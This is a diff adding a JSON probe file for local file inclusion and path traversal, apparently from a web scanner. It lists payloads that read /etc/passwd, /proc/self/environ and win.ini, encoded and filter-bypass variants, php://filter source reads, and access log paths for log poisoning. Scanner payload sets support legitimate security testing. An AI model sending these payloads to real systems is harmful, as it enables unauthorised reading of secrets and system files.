@@ -1,0 +1,39 @@
+{
+  "name": "lfi",
+  "说明": "路径遍历 / 任意文件读取探针。判定必须看 linux/windows 标记串，不能只看状态码。",
+  "sets": {
+    "linux": [
+      "/etc/passwd",
+      "../../../../etc/passwd",
+      "....//....//....//....//etc/passwd",
+      "..%2f..%2f..%2f..%2fetc%2fpasswd",
+      "..%252f..%252f..%252f..%252fetc%252fpasswd",
+      "/etc/passwd%00",
+      "/proc/self/environ",
+      "/etc/hosts"
+    ],
+    "windows": [
+      "C:\\Windows\\win.ini",
+      "..\\..\\..\\..\\windows\\win.ini",
+      "C:/Windows/win.ini",
+      "..%5c..%5c..%5c..%5cwindows%5cwin.ini",
+      "C:\\boot.ini"
+    ],
+    "filter_bypass": [
+      "....//....//etc/passwd",
+      "..;/..;/..;/etc/passwd",
+      "/etc/./passwd",
+      "/etc//passwd",
+      "php://filter/convert.base64-encode/resource=index.php",
+      "php://filter/read=convert.base64-encode/resource=/etc/passwd",
+      "file:///etc/passwd",
+      "/proc/self/cmdline"
+    ],
+    "log_poison": [
+      "/var/log/apache2/access.log",
+      "/var/log/nginx/access.log",
+      "/var/log/httpd/access_log"
+    ]
+  },
+  "pairs": {}
+}
